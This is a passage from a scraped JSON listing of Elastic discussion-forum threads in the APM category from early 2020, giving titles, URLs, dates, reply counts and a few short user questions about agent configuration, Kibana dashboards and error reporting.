    "title": "Elastic APM throws warning illegal_argument_exception with reason the number of source shards [4] must be a factor of [30]",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 11, 2020, 12:45pm March 11, 2020, 3:23pm March 12, 2020, 7:38am April 2, 2020, 3:38am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dc91cda0-caa6-4e0a-abd1-14d3d3dcb5a8",
    "url": "https://discuss.elastic.co/t/elastic-apm-throws-error-illegal-state-exception-with-reason-there-are-no-ingest-nodes-in-this-cluster-unable-to-forward-request-to-an-ingest-node/223134",
    "title": "Elastic APM throws error illegal_state_exception with reason There are no ingest nodes in this cluster, unable to forward request to an ingest node",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 11, 2020, 12:52pm March 12, 2020, 2:04am April 1, 2020, 10:04pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c0d9f548-cf33-4f68-8e76-473f1e81ec2e",
    "url": "https://discuss.elastic.co/t/transaction-sample-rate-has-no-effect-on-disk-size/223015",
    "title": "Transaction sample rate has no effect on disk size",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 11, 2020, 2:27am March 11, 2020, 2:11am March 11, 2020, 11:46pm March 11, 2020, 11:48pm April 1, 2020, 7:48pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "94a08bd1-104d-4311-90d7-2d9d4b2cd9f9",
    "url": "https://discuss.elastic.co/t/how-can-apm-agent-prevent-to-send-some-request/222922",
    "title": "How can apm agent prevent to send some request",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 10, 2020, 11:39am March 10, 2020, 12:34pm March 11, 2020, 5:03am April 1, 2020, 1:03am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ec4329cf-4ea5-42ae-936a-e383b50cad41",
    "url": "https://discuss.elastic.co/t/incorrect-error-grouping-for-java-apm-client-v-1-13/221578",
    "title": "Incorrect Error Grouping for java apm client v 1.13",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 2, 2020, 7:36am March 2, 2020, 3:29pm March 6, 2020, 8:34am March 10, 2020, 7:24am March 10, 2020, 8:00am March 10, 2020, 8:05am March 10, 2020, 8:20am March 10, 2020, 8:40am March 10, 2020, 8:46am March 31, 2020, 4:46am",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "65433069-4788-47e6-9b54-9c979d8bcdd7",
    "url": "https://discuss.elastic.co/t/missing-data-in-apm-dashboards-in-kibana/222640",
    "title": "Missing data in APM Dashboards in Kibana",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 9, 2020, 8:13am March 9, 2020, 7:31am March 9, 2020, 8:09am March 9, 2020, 8:58am March 9, 2020, 9:30am March 9, 2020, 10:15am March 9, 2020, 11:02am March 9, 2020, 11:27am March 9, 2020, 12:00pm March 9, 2020, 12:25pm March 9, 2020, 1:14pm March 9, 2020, 2:00pm March 10, 2020, 6:21am March 10, 2020, 6:30am March 10, 2020, 8:17am March 31, 2020, 4:17am",
    "body": "",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "bde60de7-8f91-4cf3-aa83-7737c98d8d6f",
    "url": "https://discuss.elastic.co/t/error-typeerror-cannot-read-property-starttime-of-undefined/222725",
    "title": "Error: TypeError: Cannot read property 'startTime' of undefined",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 9, 2020, 2:14pm March 9, 2020, 2:30pm March 30, 2020, 10:30am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5a40cc5b-b8d1-4f83-9b47-751c1521a4bc",
    "url": "https://discuss.elastic.co/t/how-can-i-get-the-mq-message-body-for-example-activemq-kafka/222632",
    "title": "How can I get the mq message body ,for example:Activemq、kafka？",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 9, 2020, 2:24am March 9, 2020, 2:28am March 9, 2020, 7:40am March 9, 2020, 8:29am March 9, 2020, 12:35pm March 9, 2020, 12:45pm March 9, 2020, 2:29pm March 30, 2020, 10:29am",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "3932065d-ee0f-4e5d-a18a-64c530729a38",
    "url": "https://discuss.elastic.co/t/apm-rum-click-events-transaction-names/222496",
    "title": "APM RUM Click events - Transaction Names",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 6, 2020, 5:26pm March 9, 2020, 2:11pm March 9, 2020, 2:11pm March 30, 2020, 10:11am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9f4142df-cf0c-4d96-ab96-79fa84c63691",
    "url": "https://discuss.elastic.co/t/hi-can-someone-show-a-relatively-complete-and-runnable-example-to-show-how-to-instrument-a-go-program/222500",
    "title": "Hi, can someone show a relatively complete and runnable example to show how to instrument a go program?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 6, 2020, 6:41pm March 9, 2020, 6:31am March 30, 2020, 2:31am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1f7becce-30b1-4367-ba0a-c4495894abf0",
    "url": "https://discuss.elastic.co/t/apm-only-capture-500-code-requestbody-can-not-caputure-200-requestbody/221650",
    "title": "APM only capture 500 code requestBody ,can not caputure 200 requestBody",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 2, 2020, 9:14am March 4, 2020, 6:22am March 6, 2020, 4:26am March 6, 2020, 4:28am March 8, 2020, 5:30am March 29, 2020, 1:30am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "71e1a382-eb35-41ad-992e-1172153ec35d",
    "url": "https://discuss.elastic.co/t/parentid-on-frontend-end-and-backend-agent-is-not-associated/222284",
    "title": "Parentid on frontend end and backend agent is not associated",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 5, 2020, 1:21pm March 5, 2020, 3:01pm March 6, 2020, 3:18am March 7, 2020, 1:54am March 7, 2020, 1:55am March 27, 2020, 9:56pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "d2477c92-9603-484a-abc5-7b04a4e0d4e6",
    "url": "https://discuss.elastic.co/t/monitoring-for-in-flight-requests-jobs/221436",
    "title": "Monitoring for In-flight Requests / Jobs",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 28, 2020, 1:26pm March 1, 2020, 11:30am March 6, 2020, 7:44pm March 27, 2020, 3:44pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a4ff7f5a-b41f-4134-81ac-82bbc944ca40",
    "url": "https://discuss.elastic.co/t/what-is-the-differences-of-public-api-and-elastic-apm-opentracing-bridge-of-java-agent/221802",
    "title": "What is the differences of Public API and Elastic APM OpenTracing bridge of JAVA agent?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 3, 2020, 3:51am March 3, 2020, 1:33pm March 6, 2020, 4:25am March 27, 2020, 12:25am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9c0b874c-ce56-4491-b36e-2fc6c75070df",
    "url": "https://discuss.elastic.co/t/sanitize-field-names-confusion-and-minimizing-payload-size/221813",
    "title": "Sanitize_field_names confusion, and minimizing payload size",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 3, 2020, 7:47am March 4, 2020, 6:40am March 4, 2020, 4:44pm March 5, 2020, 5:56pm March 5, 2020, 5:56pm March 26, 2020, 1:56pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "b3c1d980-3371-4962-baf3-af0e57f01281",
    "url": "https://discuss.elastic.co/t/java-agent-to-monitor-micro-services/221500",
    "title": "Java agent to monitor Micro-services",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 29, 2020, 5:18am March 1, 2020, 8:43am March 1, 2020, 2:01pm March 3, 2020, 1:15pm March 3, 2020, 1:15pm March 4, 2020, 8:17am March 4, 2020, 6:40pm March 5, 2020, 8:38am March 5, 2020, 1:18pm March 26, 2020, 9:18am",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "0c52f21f-2aef-4029-b950-37281856f97a",
    "url": "https://discuss.elastic.co/t/apm-dashboard/222220",
    "title": "APM dashboard",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 5, 2020, 8:32am March 26, 2020, 3:43am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "614087ab-c9b7-4625-b8e7-b6efac6dcb37",
    "url": "https://discuss.elastic.co/t/golang-apm-agent-panic-runtime-error-invalid-memory-address-or-nil-pointer-dereference/222068",
    "title": "GoLang APM agent panic runtime error: invalid memory address or nil pointer dereference",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 4, 2020, 12:39pm March 5, 2020, 1:17am March 5, 2020, 4:32am March 26, 2020, 12:32am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ce3d5653-b8e9-442f-9494-0ca165395324",
    "url": "https://discuss.elastic.co/t/apm-rum-js-agent-no-tracing-headers-added/219217",
    "title": "APM RUM JS agent no tracing headers added",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 13, 2020, 4:16pm February 14, 2020, 12:14pm February 14, 2020, 12:57pm February 19, 2020, 3:23pm March 4, 2020, 7:12pm March 25, 2020, 3:12pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "812ae4da-01ce-4034-8088-abbda61d53fc",
    "url": "https://discuss.elastic.co/t/java-socket/221970",
    "title": "Java Socket",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 4, 2020, 6:32am March 4, 2020, 4:38am March 4, 2020, 4:51am March 4, 2020, 8:32am March 4, 2020, 8:41am March 25, 2020, 4:41am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "999ba260-df01-42d7-960e-4fc495a69be0",
    "url": "https://discuss.elastic.co/t/support-for-automatic-jms-monitoring-in-apm-6-7-1/221040",
    "title": "Support for automatic JMS monitoring in APM 6.7.1",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 26, 2020, 2:00pm February 26, 2020, 2:10pm February 27, 2020, 10:38am February 27, 2020, 12:37pm March 2, 2020, 12:32pm March 4, 2020, 6:51am March 25, 2020, 2:51am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "a0089286-c390-4056-8f82-f943e1afd43c",
    "url": "https://discuss.elastic.co/t/edit-axis-parameter-in-certain-graphs/221790",
    "title": "Edit axis parameter in certain graphs",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 4, 2020, 6:33am March 23, 2020, 8:31pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7813589e-c249-4342-8311-e27b84287281",
    "url": "https://discuss.elastic.co/t/service-unavailable-crashing-the-container/220858",
    "title": "\"Service Unavailable\" crashing the container",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 25, 2020, 12:51pm February 25, 2020, 2:33pm February 25, 2020, 4:31pm March 3, 2020, 8:59pm March 24, 2020, 5:11pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "558d6f94-1b85-4e88-81db-5518795f4fa5",
    "url": "https://discuss.elastic.co/t/elastic-apm-transaction-are-not-showing-in-asp-net-mvc-classic-framework/219677",
    "title": "Elastic APM Transaction are not showing in ASP.NET MVC Classic Framework",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 17, 2020, 8:17pm February 17, 2020, 9:27pm February 18, 2020, 3:00pm February 18, 2020, 3:21pm February 18, 2020, 5:18pm February 18, 2020, 10:19pm February 19, 2020, 2:47am February 21, 2020, 4:22pm March 2, 2020, 8:46pm March 3, 2020, 8:11pm March 3, 2020, 8:29pm March 3, 2020, 8:42pm March 24, 2020, 4:42pm",
    "body": "",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "c0212bf4-97dc-44ad-884a-8c05a2e47fe8",
    "url": "https://discuss.elastic.co/t/java-agent-plugin-with-public-api/221227",
    "title": "Java Agent plugin with public api",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 27, 2020, 5:33pm February 27, 2020, 4:23pm February 29, 2020, 4:53am February 28, 2020, 5:23am March 2, 2020, 2:17pm March 2, 2020, 2:31pm March 2, 2020, 4:22pm March 3, 2020, 1:04am March 3, 2020, 9:05am March 3, 2020, 9:20am March 24, 2020, 5:20am",
    "body": "",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "ac6676c3-ea97-446a-b51c-319b6d147e11",
    "url": "https://discuss.elastic.co/t/cannot-read-property-map-of-undefined-bad-request-while-create-apm-dashboards-in-kibana/221269",
    "title": "Cannot read property 'map' of undefined, bad request while create APM dashboards in Kibana",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 27, 2020, 5:17pm March 2, 2020, 7:01pm March 23, 2020, 3:01pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3f7502a4-d05a-4cd7-bb24-40b903e5291c",
    "url": "https://discuss.elastic.co/t/java-client-error-related-secret-token/221705",
    "title": "Java client error related secret_token",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 2, 2020, 2:47pm March 2, 2020, 3:29pm March 23, 2020, 11:16am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5f3d5c17-e537-47cb-a432-e8f98b2e70f6",
    "url": "https://discuss.elastic.co/t/apm-pg-module-not-recording-cockroachdb/221377",
    "title": "APM pg module not recording (cockroachdb)",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 28, 2020, 8:06am March 1, 2020, 8:12am March 2, 2020, 5:48am March 23, 2020, 2:03am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "41ab74e5-5ae2-471f-8c72-0b5f831846e8",
    "url": "https://discuss.elastic.co/t/apm-metrics/220039",
    "title": "APM metrics",
    "category": [
      "APM"
    ],
    "author": "AndresL",
    "date": "February 19, 2020, 5:39pm February 20, 2020, 12:40pm February 21, 2020, 10:18am February 28, 2020, 1:34pm March 20, 2020, 9:34am",
    "body": "Hi, i have hosts hosting multiple applications and i want to setup APM on some applications. But i want to collect metrics from the server and i dont want to collect metrics from each agent/application running. any idea how to do this? can i connect metricbeats to apm?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "185dc512-9ca0-4cdf-87e0-404400db58dc",
    "url": "https://discuss.elastic.co/t/apm-uknow-fields/218438",
    "title": "Apm Uknow fields",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 12, 2020, 1:19pm February 18, 2020, 10:38pm February 20, 2020, 11:01am February 27, 2020, 10:59am February 27, 2020, 1:25pm March 26, 2020, 1:27pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "a2cfe2eb-bc1e-4945-8ac6-18d56250c443",
    "url": "https://discuss.elastic.co/t/getting-an-error-when-setting-include-type-name-to-true/221214",
    "title": "Getting an error when setting include_type_name to True",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 27, 2020, 11:11am February 27, 2020, 12:53pm March 19, 2020, 8:53am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "cc852b61-8828-4cc1-9e7c-005d2d7b31a7",
    "url": "https://discuss.elastic.co/t/transaction-id-is-not-propagated-to-a-nodejs-application-through-org-springframework-web-reactive-function-client-webclient-call/221004",
    "title": "Transaction id is not propagated to a NodeJS application through org.springframework.web.reactive.function.client.WebClient call",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 26, 2020, 10:12am February 26, 2020, 2:51pm February 26, 2020, 9:05pm March 18, 2020, 5:13pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "49dfacf6-4e1a-4261-a300-ddaaa2c19465",
    "url": "https://discuss.elastic.co/t/what-are-the-criteria-for-transaction-span/218876",
    "title": "What are the criteria for transaction&span?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 12, 2020, 12:41am February 13, 2020, 8:03am February 17, 2020, 2:04am February 18, 2020, 4:16pm February 20, 2020, 8:42am February 26, 2020, 4:16pm March 18, 2020, 12:16pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "da72f4ca-093e-4d82-8a50-1e5f919ade11",
    "url": "https://discuss.elastic.co/t/slf4j-error-not-captured/216987",
    "title": "Slf4j error not captured",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 29, 2020, 11:09am January 29, 2020, 12:12pm January 29, 2020, 12:15pm January 29, 2020, 4:03pm February 18, 2020, 9:10am February 24, 2020, 6:15am February 26, 2020, 3:55pm March 18, 2020, 12:00pm",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "5a7df8db-dda8-49ab-8cae-1f27dbd9abcd",
    "url": "https://discuss.elastic.co/t/errors-are-not-displaying-in-the-errors-view/220895",
    "title": "Errors are not displaying in the Errors view",
    "category": [
      "APM"
    ],
    "author": "Noah_Troncoso",
    "date": "February 25, 2020, 9:03pm February 25, 2020, 8:26pm February 25, 2020, 8:57pm February 25, 2020, 9:06pm February 26, 2020, 8:27am February 26, 2020, 12:51pm February 26, 2020, 3:16pm March 25, 2020, 3:17pm",
    "body": "I have connected my Java application to Kibana and it is working correctly. My app runs in tomcat, if that matters. However, when I trigger an exception in the Java code, it is not showing in the Kibana \"Errors\" section. What are the requirements to make this work? I tried searching for help first, but you have to imagine that searching for something like \"Kibana show errors\" is not going to give me what I'm looking for. Thanks for any help!",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "ab77452a-0187-458b-a94b-6adf8f9879e5",
    "url": "https://discuss.elastic.co/t/apm-ui/220890",
    "title": "APM UI",
    "category": [
      "APM"
    ],
    "author": "mhr",
    "date": "February 25, 2020, 4:29pm February 25, 2020, 10:58pm February 26, 2020, 3:16pm March 18, 2020, 11:16am",
    "body": "How to configure Kibana AMP UI of Remote clusters. Remote cluster configuration has been done successfully. Index of Remote elastic cluster is also available. Elastic Version is 7x.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "331601ff-7ae0-47a0-8635-07a70d3a7ab8",
    "url": "https://discuss.elastic.co/t/apm-typeerror-cannot-read-property-key-of-undefined/220811",
    "title": "APM - TypeError: Cannot read property 'key' of undefined",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 26, 2020, 2:06pm February 26, 2020, 2:24pm February 26, 2020, 2:24pm March 25, 2020, 2:24pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d0f87893-d4ca-493a-9d7f-261773fb3856",
    "url": "https://discuss.elastic.co/t/update-apm-indices-feeder/218966",
    "title": "Update APM indices feeder",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 13, 2020, 8:07pm February 26, 2020, 2:19pm March 18, 2020, 10:19am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "22edf0dc-ef9a-4855-a5ea-c3b56a21f3fa",
    "url": "https://discuss.elastic.co/t/transaction-duration-in-micro-seconds/220713",
    "title": "Transaction duration in micro seconds",
    "category": [
      "APM"
    ],
    "author": "anjana1",
    "date": "February 24, 2020, 7:05pm February 26, 2020, 8:49pm March 17, 2020, 2:57pm",
    "body": "Kibana version : 7.6 Elasticsearch version : 7.6 APM Server version : 7.3.2 APM Agent language and version : java 1.9.0 Fresh install or upgraded from other version? fresh install Is there anything special in your setup? For example, are you using the Logstash or Kafka outputs? Are you using a load balancer in front of the APM Servers? Have you changed index pattern, generated custom templates, changed agent configuration etc. :-----No Description of the problem including expected versus actual behavior. Please include screenshots (if relevant) : Steps to reproduce : Is there any way we can show the duration in the graphs in seconds or milliseconds. Because my dashboard gets too cluttered and there are like too many numbers in the duration. As shown on the image below the Y axis has too many digits . How can I show it in smaller numbers instead of micro seconds image876×450 13.6 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "532dac38-1ba5-4e0b-aeef-6b310753d2d2",
    "url": "https://discuss.elastic.co/t/how-to-customer-java-agent-plugin/220638",
    "title": "How to customer java agent plugin?",
    "category": [
      "APM"
    ],
    "author": "hyhong",
    "date": "February 24, 2020, 11:44am February 24, 2020, 11:48am March 16, 2020, 7:48am",
    "body": "I want to customer a plugin,but there isn't a document about how to use the ElasticApmInstrumentation class and the class's method. Anyone provide,thank you.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fb193f30-1b82-48c0-ba6c-9fd1a026109a",
    "url": "https://discuss.elastic.co/t/is-there-any-documentation-on-how-to-enable-apm-rum-for-python-flask-agent/218245",
    "title": "Is there any documentation on how to enable APM RUM for Python Flask agent?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 6, 2020, 8:24pm February 6, 2020, 8:23pm February 21, 2020, 10:02pm March 13, 2020, 6:02pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "289c52f9-7f27-4d7a-a257-5484ce3260a9",
    "url": "https://discuss.elastic.co/t/scala-integration/219214",
    "title": "Scala integration",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 13, 2020, 3:26pm February 13, 2020, 3:54pm February 21, 2020, 6:18pm March 13, 2020, 2:18pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "8f7c2192-6f3e-41a7-9b42-3ee9cfcea50e",
    "url": "https://discuss.elastic.co/t/good-tutorial-for-apm-on-windows/220406",
    "title": "Good tutorial for APM on Windows?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 21, 2020, 3:27pm March 13, 2020, 11:27am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ac702ed8-d308-4ac7-8c18-215823763bdd",
    "url": "https://discuss.elastic.co/t/apm-transactions-not-showing-in-kibana-after-upgrade-from-7-5-0-to-7-5-2/219269",
    "title": "APM transactions not showing in Kibana after upgrade from 7.5.0 to 7.5.2",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 13, 2020, 6:11pm February 14, 2020, 9:49am February 18, 2020, 2:30pm February 21, 2020, 4:15pm March 13, 2020, 10:25am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7eeb00f7-c8d1-4cf4-9a3d-d26d16e75d59",
    "url": "https://discuss.elastic.co/t/need-support-of-elastic-apm-agent-for-kotlin-coroutine/220280",
    "title": "Need support of Elastic APM Agent for Kotlin Coroutine",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 21, 2020, 1:21am February 21, 2020, 8:07am March 13, 2020, 4:07am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0745cf36-74c4-4b19-b5b1-72853be2ba76",
    "url": "https://discuss.elastic.co/t/i-need-an-api-that-will-allow-me-to-insert-my-data-in-the-apm-server/220254",
    "title": "I need an api that will allow me to insert my data in the apm server",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 20, 2020, 7:15pm February 21, 2020, 1:03am March 12, 2020, 9:03pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b00351d5-8755-4555-9562-c118f62a38d7",
    "url": "https://discuss.elastic.co/t/application-wont-load-when-using-useallelasticapm/219336",
    "title": "Application won't load when using UseAllElasticApm",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 14, 2020, 9:08am February 14, 2020, 3:03pm February 14, 2020, 4:29pm February 17, 2020, 6:41am February 18, 2020, 10:32pm February 19, 2020, 6:52am February 20, 2020, 12:15pm February 20, 2020, 12:26pm February 20, 2020, 8:43pm March 12, 2020, 4:43pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "604488c3-5478-4333-a5be-a53d950ead3b",
    "url": "https://discuss.elastic.co/t/elastic-apm-plus-ms-application-insights-spamms-logs-in-net-core-2-1-web-app/219951",
    "title": "Elastic APM plus MS Application Insights spamms Logs in .net Core 2.1 Web App",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 19, 2020, 11:36am February 19, 2020, 11:59am February 19, 2020, 12:29pm February 20, 2020, 11:00am February 20, 2020, 12:23pm March 12, 2020, 8:23am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "994aa4e8-01fa-4b8b-af34-6d226c434d0f",
    "url": "https://discuss.elastic.co/t/enable-apm-service-map/219926",
    "title": "Enable APM Service Map",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 19, 2020, 9:15am February 19, 2020, 4:33pm February 19, 2020, 4:33pm March 11, 2020, 12:42pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3a02254a-58fa-4f82-a4c1-de758e3a53a0",
    "url": "https://discuss.elastic.co/t/apm-angular-js-unknown-transaction/216026",
    "title": "APM Angular JS - Unknown transaction",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "January 22, 2020, 12:47pm January 22, 2020, 10:20am January 22, 2020, 10:20am February 14, 2020, 12:13pm February 19, 2020, 3:14pm March 18, 2020, 5:14pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "8f06f096-ed6f-42c8-88a9-047302f403b7",
    "url": "https://discuss.elastic.co/t/how-can-i-log-response-body-in-apm-in-python/219733",
    "title": "How can I log response body in APM in python",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 18, 2020, 8:34am February 18, 2020, 9:49am February 18, 2020, 2:21pm February 18, 2020, 3:19pm February 19, 2020, 6:21am February 19, 2020, 8:21am February 19, 2020, 8:43am February 19, 2020, 11:08am March 11, 2020, 7:08am",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "6d16938c-204d-4596-8fc7-cc610573e86e",
    "url": "https://discuss.elastic.co/t/not-getting-required-information-like-transaction-error-for-python-django-application/219900",
    "title": "Not getting required information like transaction,error for python(django) application",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 19, 2020, 6:39am February 19, 2020, 6:38am February 19, 2020, 6:47am February 19, 2020, 8:20am March 11, 2020, 4:20am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "dbb531c3-354c-4835-911b-5dc28f817bc6",
    "url": "https://discuss.elastic.co/t/apm-asp-net-agent-no-span-data-captured-in-elasticsearch/218491",
    "title": "[APM] ASP.Net Agent no span data captured in Elasticsearch",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 10, 2020, 12:36am February 10, 2020, 2:05pm February 11, 2020, 1:02am February 12, 2020, 6:19pm February 13, 2020, 11:27am February 18, 2020, 10:35pm February 19, 2020, 1:26am March 10, 2020, 9:21pm",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "9f3e851e-fe87-443f-972e-1b1fb7d2a467",
    "url": "https://discuss.elastic.co/t/unable-to-bind-apm-to-java-process/219773",
    "title": "Unable to bind APM to java process",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 18, 2020, 3:55pm February 18, 2020, 4:12pm March 10, 2020, 12:12pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "bc3a444f-6fd6-46c4-84e4-1fe4e12a47e6",
    "url": "https://discuss.elastic.co/t/java-self-attach-agent-public-api-how-to-properly-pass-the-scope-and-close-span-children-without-closing-parent-span/219337",
    "title": "Java self-attach agent + public API - How to properly pass the scope and close span-children without closing parent-span",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 14, 2020, 9:23am February 18, 2020, 8:23am February 18, 2020, 8:42am February 18, 2020, 9:16am March 10, 2020, 5:09am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "76822327-abb8-467f-8ea4-e9512155580e",
    "url": "https://discuss.elastic.co/t/adding-context-to-trace-name/219559",
    "title": "Adding context to trace name?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 18, 2020, 9:16am February 18, 2020, 8:48am February 18, 2020, 9:07am March 10, 2020, 5:09am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "85013435-1b10-4515-a1aa-4ee6ca7d2f66",
    "url": "https://discuss.elastic.co/t/java-agent-the-http-transaction-showing-in-kibana-has-something-wrong-with-the-http-status-code/219454",
    "title": "[Java Agent] the http transaction showing in kibana has something wrong with the http status code",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 18, 2020, 8:49am March 6, 2020, 10:07pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d2b64320-1ff4-43d3-8f78-818409089f5d",
    "url": "https://discuss.elastic.co/t/agent-inherit-xmx-flag-from-application/219732",
    "title": "Agent inherit -Xmx flag from application",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 18, 2020, 3:55pm February 18, 2020, 8:44am February 18, 2020, 8:46am March 10, 2020, 4:46am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "739e8c8e-7b76-4232-9f0e-62ef830d944f",
    "url": "https://discuss.elastic.co/t/apm-java-agent-accesscontrolexception/218385",
    "title": "APM Java Agent - AccessControlException",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "February 7, 2020, 4:58pm February 9, 2020, 6:36am February 17, 2020, 6:24pm March 9, 2020, 2:24pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4a979003-6939-4408-af8d-d40963c081e8",
    "url": "https://discuss.elastic.co/t/apm-ui-query-bar-broken/219595",
    "title": "APM UI query bar broken",
    "category": [
      "APM"
    ],
    "author": "heydo",
    "date": "February 17, 2020, 10:57am February 17, 2020, 4:20pm March 9, 2020, 12:20pm",
